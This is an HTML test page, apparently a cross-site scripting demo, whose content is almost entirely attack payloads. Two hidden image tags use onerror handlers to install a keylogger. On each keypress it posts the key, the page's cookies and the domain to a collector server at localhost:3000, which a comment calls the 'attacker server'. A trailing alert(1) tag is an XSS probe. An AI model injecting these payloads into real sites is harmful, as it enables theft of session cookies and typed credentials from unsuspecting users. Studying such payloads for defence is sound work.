<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Maclious Script Test</title>
</head>

<body>
    <!-- Injected script compressed to one line-->

    <img hidden src='x' onerror="document.onkeypress=function(e){ var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"/>
    
    <!-- Injected script that logs user's key press, domain and -->
    <img hidden src='x' onerror="document.onkeypress=function(e){ 
        var xhr = new XMLHttpRequest(); //Create new http request
        //Configure HTTP POST request to be send to attacker server
        xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); //Send keystroke as paramater
        //Allow CORS and use of JSON 
        xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); 
        //Send HTTP POST request with the defined body containing cookie and domain
        xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"
    />
</body>

</html>

<img src="http://inexist.ent" onerror="javascript:alert(1)"/>
